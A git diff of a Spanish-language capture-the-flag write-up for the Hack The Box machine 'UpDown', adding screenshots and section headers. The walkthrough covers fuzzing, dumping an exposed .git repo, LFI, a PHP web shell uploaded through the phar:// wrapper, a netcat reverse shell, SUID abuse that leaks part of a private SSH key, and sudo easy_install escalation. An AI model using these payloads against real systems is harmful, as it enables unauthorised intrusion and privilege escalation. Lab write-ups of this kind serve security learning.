@@ -1,17 +1,24 @@
 # 10.10.11.177 - Updown
+![UpDown](https://user-images.githubusercontent.com/96772264/215055989-95ccfbda-5386-4ce6-9a21-67e50c460e48.png)
+
 -----------------------
+# Part 1: Enumeracion y fuzzing
+
 Puertos abiertos 22(ssh) y 80(http)
 ```console
 └─$ whatweb http://10.10.11.177
 Apache[2.4.41] HTML5
 ```
 La web nos muestra una utilidad para ver si funcionan servidores, junto al titulo siteisup.htb (meterlo en el /etc/hosts)
+![updown](https://user-images.githubusercontent.com/96772264/215056022-7ecf8726-e607-425e-95a7-3fb6d1c5e78f.PNG)
 
 Como las maquinas de htb no tienen salida a internet, no podemos probar con el ejemplo de google.com:
-- http://localhost:80 -> da como valido, asi que podemos tener un SSRF.  
-- http://localhost:22 -> sabemos que este puerto ssh esta abierto pero no nos dice nada.  
+```
+- http://localhost:80 -> da como valido, asi que podemos tener un SSRF.   
+- http://localhost:22 -> sabemos que este puerto ssh esta abierto pero no nos dice nada.   
 - http://10.10.14.14 -> nuestro servidor (abierto asi ```sudo nc -nlvp 80```) nos llega una peticion /GET.  
-
+```
+Si empezamos con fuzzing:
 ```console
 └─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://siteisup.htb/FUZZ/
 000000820:   200        0 L      0 W        0 Ch        "dev"
@@ -26,6 +33,8 @@ Como las maquinas de htb no tienen salida a internet, no podemos probar con el e
 └─$ wfuzz -c --hl=39 -w $(locate bitquark-subdomains-top100000.txt) -H "Host: FUZZ.siteisup.htb" -u http://siteisup.htb/ -t 100 
 000000022:   403        9 L      28 W       281 Ch      "dev"
 ```
+-----------------------
+# Part 2: Git repo
 
 Como tenemos un .git lo sacaremos con git-dumper
 ```console
@@ -33,10 +42,7 @@ Como tenemos un .git lo sacaremos con git-dumper
 ```
 Este repo de git aplica al subdominio "dev.siteisup" no al original:
 - changelog.txt -> "To-Do -> eliminar la opcion upload" vulnerable?
-
-index.php
-
-Checker.php
+Tabmien están *index.php* y *Checker.php*
 
 Si hacemos un git-log encontramos esta branch...
 ```console
@@ -58,9 +64,11 @@ diff --git a/.htaccess b/.htaccess
 
 Esto lo que quiere decir esque /dev tiene que tener la cabecera "Special-Dev: only4dev" para que te de acceso.
 Una vez puesta esta cabecera con la extension "simply modify headers" ya nos aparece una web similar a la anterior
+![updown2](https://user-images.githubusercontent.com/96772264/215056095-f26f1060-3c35-4c24-8f3c-64878b760a12.PNG)
+![updown3](https://user-images.githubusercontent.com/96772264/215056155-4b24aab1-e820-4ef2-9395-e1d1697d5465.PNG)
 
 ------------------------------------------------
-## Page?admin
+# Part 3: LFI -> Page?admin
 
 El codigo del repo que nos hemos bajado y que concierne a esta parte:
 ```php
@@ -87,7 +95,8 @@ PD9waHAKaWYoRElSRUNUQUNDRVNTKXsKCWRpZSgiQWNjZXNzIERlbmllZCIpOwp9Cj8+CjwhRE9DVFlQ
 ```
 El tema esque esos archivos php ya los tenemos gracias al repo asi que no es muy util por ahora.
 
------------------------------------------------------
+------------------------------------------------
+# Part 4: File upload phar
 
 De no poner la url con el "page?" el codigo que entra en juego es checker.php
 
@@ -145,6 +154,8 @@ Si creamos un "<?php system($_GET['cmd']); ?>" y lo ponemos como shell.txt se su
 shell.cucuxii: Zip archive data   # Aunque tenga la extension jpeg esto es un zip.
 ```
 En /uploads aparece un nuevo directorio -> 1526e941f20f74050a82951a5bda79e2, ahi dentro está shell.jpeg
+![updown4](https://user-images.githubusercontent.com/96772264/215056204-2a60d2c2-4dab-41f3-9095-d4a337e0ae72.PNG)
+
 Si accedemos con phar por el lfi al archivo de dentro (shell.php que es shell porque concatena ello solo el .php)
 ```console
 └─$ curl -s -H "Special-Dev: only4dev" 'http://dev.siteisup.htb/?page=phar://uploads/1526e941f20f74050a82951a5bda79e2/shell.jpeg/shell' -I
@@ -156,6 +167,7 @@ Si cambiamos su contenido a "<?php phpinfo(); ?>" y  repetimos el proceso tenemo
 Si copiamos las disabled functions las metemos en el archivo "disabled_functions" 
 y con vim sustituimos las , por retorno de carro -> :%s/,/\r/g acabamos con una lista bien clara de las 
 funciones prohibidas entre las que estan system, exec o shell_exec entre todas.
+![updown5](https://user-images.githubusercontent.com/96772264/215056216-ec6cf51c-dfee-4718-8bf7-5e6c777f43f8.PNG)
 
 Esta es una lista de las funciones que nos permiten ejecutar comandos (lo metemos en un archivo llamado dangerous)
 ```
@@ -189,7 +201,8 @@ Se sube
 └─$ sudo nc -nlvp 443
 www-data@updown:/var/www/dev$ 
 ```
-
+------------------------------------------------
+# Part 5: Explotando python2
 
 - SUIDs -> /home/developer/dev/siteisup
 ```console
@@ -227,6 +240,8 @@ NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05...
 └─$ ssh -i id_rsa developer@10.10.11.177   
 developer@updown:~$ 
 ```
+------------------------------------------------
+# Part 6: Gtfobins
 
 Nuestro usuario tiene como sudoers -> (ALL) NOPASSWD: /usr/local/bin/easy_install
 En [gtfobins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) nos dicen como explotar esto:
